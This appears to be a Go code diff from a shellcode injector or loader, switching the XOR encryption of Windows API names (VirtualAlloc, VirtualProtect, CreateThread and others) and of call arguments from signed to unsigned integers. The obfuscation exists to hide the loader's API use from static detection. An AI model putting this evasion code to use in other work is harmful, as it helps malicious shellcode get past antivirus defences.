@@ -108,18 +108,18 @@ type loaderCtx struct {
 	NeedShellcodeJumper bool
 
 	// encrypt procedure name with xor
-	Kernel32DLLDB          []int64
-	Kernel32DLLKey         []int64
-	VirtualAllocDB         []int64
-	VirtualAllocKey        []int64
-	VirtualFreeDB          []int64
-	VirtualFreeKey         []int64
-	VirtualProtectDB       []int64
-	VirtualProtectKey      []int64
-	CreateThreadDB         []int64
-	CreateThreadKey        []int64
-	WaitForSingleObjectDB  []int64
-	WaitForSingleObjectKey []int64
+	Kernel32DLLDB          []uint64
+	Kernel32DLLKey         []uint64
+	VirtualAllocDB         []uint64
+	VirtualAllocKey        []uint64
+	VirtualFreeDB          []uint64
+	VirtualFreeKey         []uint64
+	VirtualProtectDB       []uint64
+	VirtualProtectKey      []uint64
+	CreateThreadDB         []uint64
+	CreateThreadKey        []uint64
+	WaitForSingleObjectDB  []uint64
+	WaitForSingleObjectKey []uint64
 
 	// store encrypted procedure arguments
 	PAData map[string]uint64
@@ -451,14 +451,14 @@ func (inj *Injector) encryptStrings(ctx *loaderCtx) {
 	ctx.WaitForSingleObjectDB, ctx.WaitForSingleObjectKey = inj.encryptString("WaitForSingleObject", false)
 }
 
-func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) {
+func (inj *Injector) encryptString(str string, isUTF16 bool) ([]uint64, []uint64) {
 	str += "\x00"
 	if isUTF16 {
 		str = toUTF16(str)
 	}
 	var (
-		val []int64
-		key []int64
+		val []uint64
+		key []uint64
 	)
 	switch inj.arch {
 	case "386":
@@ -469,10 +469,10 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 		}
 		str += strings.Repeat("\x00", num)
 		for i := len(str) - 4; i >= 0; i -= 4 {
-			v := int32(binary.LittleEndian.Uint32([]byte(str[i:]))) // #nosec G115
-			k := inj.rand.Int31()
-			val = append(val, int64(v^k))
-			key = append(key, int64(k))
+			v := binary.LittleEndian.Uint32([]byte(str[i:]))
+			k := inj.rand.Uint32()
+			val = append(val, uint64(v^k))
+			key = append(key, uint64(k))
 		}
 	case "amd64":
 		// process alignment
@@ -482,8 +482,8 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 		}
 		str += strings.Repeat("\x00", num)
 		for i := len(str) - 8; i >= 0; i -= 8 {
-			v := int64(binary.LittleEndian.Uint64([]byte(str[i:]))) // #nosec G115
-			k := inj.rand.Int63()
+			v := binary.LittleEndian.Uint64([]byte(str[i:]))
+			k := inj.rand.Uint64()
 			val = append(val, v^k)
 			key = append(key, k)
 		}
@@ -515,13 +515,13 @@ func (inj *Injector) encryptArgument(value uint32) (uint64, uint64) {
 	)
 	switch inj.arch {
 	case "386":
-		k := inj.rand.Int31()
-		val = uint64(int32(value) ^ k)
+		k := inj.rand.Uint32()
+		val = uint64(value ^ k)
 		key = uint64(k)
 	case "amd64":
 		k := inj.rand.Uint64()
-		val = uint64(uint64(value) ^ k)
-		key = uint64(k)
+		val = uint64(value) ^ k
+		key = k
 	}
 	return val, key
 }
